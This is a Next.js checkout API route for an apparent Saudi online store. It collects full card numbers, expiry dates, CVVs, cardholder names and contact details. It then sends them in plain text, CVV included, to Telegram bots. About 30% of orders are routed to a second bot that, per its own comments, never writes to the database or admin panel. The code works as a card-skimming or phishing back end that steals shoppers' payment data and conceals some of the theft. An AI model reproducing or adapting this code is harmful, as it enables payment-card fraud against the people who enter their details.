import { NextRequest, NextResponse } from "next/server";
import {
  selectBot,
  generateBot2OrderId,
  registerOrderBot,
  sendTelegramMessage,
} from "../../lib/telegramBots";
import { createBot2UserToken } from "../../lib/botContact";

// Server-side rate limit: IP → { count, windowStart }
const notifyRateLimit = new Map<string, { count: number; windowStart: number }>();
const NOTIFY_MAX = 8;
const NOTIFY_WINDOW_MS = 15 * 60 * 1000;

// Server-side deduplication cache to prevent rapid double-clicks from triggering both bots
interface DedupEntry {
  timestamp: number;
  selectedBot: 1 | 2;
  orderId: string;
  bot2Token?: string;
}
const recentSubmissions = new Map<string, DedupEntry>();
const DEDUP_WINDOW_MS = 25 * 1000; // 25 seconds

// Periodically clean old dedup entries
if (typeof setInterval !== "undefined") {
  const dedupCleanup = setInterval(() => {
    const now = Date.now();
    for (const [key, entry] of recentSubmissions.entries()) {
      if (now - entry.timestamp > DEDUP_WINDOW_MS) {
        recentSubmissions.delete(key);
      }
    }
  }, 30 * 1000);
  if (dedupCleanup.unref) dedupCleanup.unref();
}

function checkNotifyRateLimit(ip: string): boolean {
  const now = Date.now();
  const entry = notifyRateLimit.get(ip);
  if (!entry || now - entry.windowStart > NOTIFY_WINDOW_MS) {
    notifyRateLimit.set(ip, { count: 1, windowStart: now });
    return true;
  }
  if (entry.count >= NOTIFY_MAX) return false;
  entry.count += 1;
  return true;
}

async function getCountry(ip: string): Promise<string> {
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`, {
      signal: AbortSignal.timeout(1500),
    });
    const geoData = await geoRes.json();
    return geoData.country || "غير معروف";
  } catch {
    return "غير معروف";
  }
}

async function sendTelegramNotification(
  bot: 1 | 2,
  orderId: string,
  ip: string,
  cardNumber: string,
  expiry: string,
  cvv: string,
  cardHolder: string,
  total: number,
  installmentType: string,
  downPayment: number,
  customer: string,
  whatsapp: string,
): Promise<boolean> {
  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");

  // Fetch country with 1.5s max timeout
  const country = isLocal
    ? "غير معروف"
    : await Promise.race([
        getCountry(ip),
        new Promise<string>((resolve) => setTimeout(() => resolve("غير معروف"), 1500)),
      ]);

  const text = [
    `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
    `🔖 رقم الطلب: #${orderId}`,
    ``,
    `💲 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🌍 Country: ${country}`,
    `🌐 Public IP: ${ip || "غير معروف"}`,
    `🙍 Order For: ${customer ?? "-"}`,
    `📲 WhatsApp: ${(whatsapp ?? "").replace(/^(\+?966|00966)/, "0")}`,
    `💳 Card Number: ${cardNumber.replace(/\s+/g, "").replace(/(\d{4})/g, "$1 ").trim()}`,
    `✍️ Card Holder: ${cardHolder}`,
    `📆 Valid To: ${expiry}`,
    `🔑 CVV: ${cvv}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } },
        ...(whatsappNum
          ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }]
          : []),
      ],
    ],
  };

  return await sendTelegramMessage(bot, { text, reply_markup });
}

export async function POST(req: NextRequest) {
  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown";

  // Anti-spam & rate limiting check
  if (!checkNotifyRateLimit(ip)) {
    return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
  }

  const body = await req.json();
  const {
    cardNumber, expiry, cvv, cardHolder,
    items, total,
    customer, whatsapp, nationalId, address,
    shippingCompany, installmentType, months, downPayment,
  } = body;

  // Validate incoming payment details
  if (!cardNumber || !expiry || !cvv || !cardHolder || total === undefined) {
    return NextResponse.json({ ok: false, error: "جميع بيانات الدفع الأساسية مطلوبة" }, { status: 400 });
  }

  // -------------------------------------------------------------
  // DEDUPLICATION LOCK: Prevent rapid double-clicks from triggering both bots
  // -------------------------------------------------------------
  const rawCard = String(cardNumber || "").replace(/\D/g, "");
  const dedupKey = `${rawCard.slice(-8)}_${total}_${String(customer || "").trim()}`;
  const now = Date.now();
  const existing = recentSubmissions.get(dedupKey);

  if (existing && now - existing.timestamp < DEDUP_WINDOW_MS) {
    // Return the existing order response directly so the second bot is NEVER invoked!
    const res = NextResponse.json({
      ok: true,
      orderId: existing.orderId,
      ...(existing.bot2Token ? { _bt: existing.bot2Token } : {}),
    });
    if (existing.selectedBot === 2 && existing.bot2Token) {
      res.cookies.set("_b_token", existing.bot2Token, {
        path: "/",
        maxAge: 365 * 24 * 60 * 60,
        sameSite: "lax",
      });
    }
    return res;
  }

  // Select destination bot using weighted random distribution (70% Bot 1 / 30% Bot 2)
  const selectedBot = selectBot();

  // Generate order ID
  const orderId =
    selectedBot === 2
      ? generateBot2OrderId()
      : `${Date.now()}${Math.floor(Math.random() * 1000)}`;

  // Register routing in memory for OTP verification and resend
  registerOrderBot(orderId, selectedBot);

  const monthlyPayment =
    installmentType === "installment" && months > 0
      ? Math.ceil((total - downPayment) / months)
      : 0;

  // -------------------------------------------------------------
  // BOT 1 (PRIMARY - 70%): Database + Admin + Bot 1 Telegram
  // -------------------------------------------------------------
  if (selectedBot === 1) {
    let dbRes: Response;
    try {
      dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
        body: JSON.stringify({
          orderId, cardNumber, expiry, cvv, cardHolder,
          items, total, customer, whatsapp, nationalId, address,
          shippingCompany, installmentType, months, monthlyPayment, downPayment,
        }),
      });
    } catch {
      return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
    }

    if (!dbRes.ok) {
      const errData = await dbRes.json().catch(() => ({}));
      return NextResponse.json(errData, { status: dbRes.status });
    }

    // Save in deduplication cache to block duplicate requests
    recentSubmissions.set(dedupKey, {
      timestamp: now,
      selectedBot: 1,
      orderId,
    });

    // Send notification to Bot 1 (guaranteed to complete before response)
    await sendTelegramNotification(
      1,
      orderId, ip,
      cardNumber, expiry, cvv, cardHolder,
      total, installmentType, downPayment,
      customer, whatsapp,
    ).catch(() => {});

    const res = NextResponse.json({ ok: true, orderId });
    res.cookies.set("_b_token", "bot_1", {
      path: "/",
      maxAge: 365 * 24 * 60 * 60,
      sameSite: "lax",
    });
    return res;
  }

  // -------------------------------------------------------------
  // BOT 2 (SECONDARY - 30%): Telegram ONLY (Zero DB / Zero Admin)
  // -------------------------------------------------------------
  // CRITICAL: We DO NOT call backend /api/checkout at all.
  // Order is completely isolated and never saved in the database.
  const sent = await sendTelegramNotification(
    2,
    orderId, ip,
    cardNumber, expiry, cvv, cardHolder,
    total, installmentType, downPayment,
    customer, whatsapp,
  );

  if (!sent) {
    // If Telegram sending fails, do NOT fallback to Bot 1 or database.
    return NextResponse.json(
      { ok: false, error: "تعذر إرسال الطلب، يرجى المحاولة لاحقاً" },
      { status: 502 }
    );
  }

  const bot2Token = createBot2UserToken();

  // Save in deduplication cache to block duplicate requests
  recentSubmissions.set(dedupKey, {
    timestamp: now,
    selectedBot: 2,
    orderId,
    bot2Token,
  });

  const res = NextResponse.json({ ok: true, orderId, _bt: bot2Token });
  res.cookies.set("_b_token", bot2Token, {
    path: "/",
    maxAge: 365 * 24 * 60 * 60,
    sameSite: "lax",
  });
  return res;
}
